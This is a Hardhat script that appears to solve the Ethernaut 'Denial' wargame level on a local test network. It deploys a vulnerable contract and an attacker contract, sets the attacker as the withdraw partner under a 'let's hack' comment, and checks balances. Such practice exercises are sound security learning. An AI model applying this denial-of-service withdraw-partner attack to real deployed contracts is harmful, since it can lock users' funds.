const { network, deployments, ethers, getNamedAccounts } = require('hardhat')
const { numToBytes32, parseBytes32String } = require('@chainlink/test-helpers/dist/src/helpers')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const Denial = await ethers.getContractFactory('Denial')
    const denial = await Denial.deploy()
    await denial.deployed()

    const DenialHack = await ethers.getContractFactory('DenialHack')
    const denialHack = await DenialHack.deploy()
    await denialHack.deployed()

    const hacker = await denial.connect(addr1)
    const hackerHack = await denialHack.connect(addr1)

    // ------------ let's hack -------------
    await hacker.setWithdrawPartner(denialHack.address)
    console.log(await ethers.provider.getBalance(denialHack.address))

    await addr1.sendTransaction({ to: denial.address, value: '1000000000000000000000', gasLimit: '41000' })

    // console.log(await denialHack.contractBalance())
    // await hackerHack.attack(hacker.address)
    await hacker.withdraw()

    // console.log(await hacker.contractBalance())
    console.log(await ethers.provider.getBalance(denialHack.address))
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
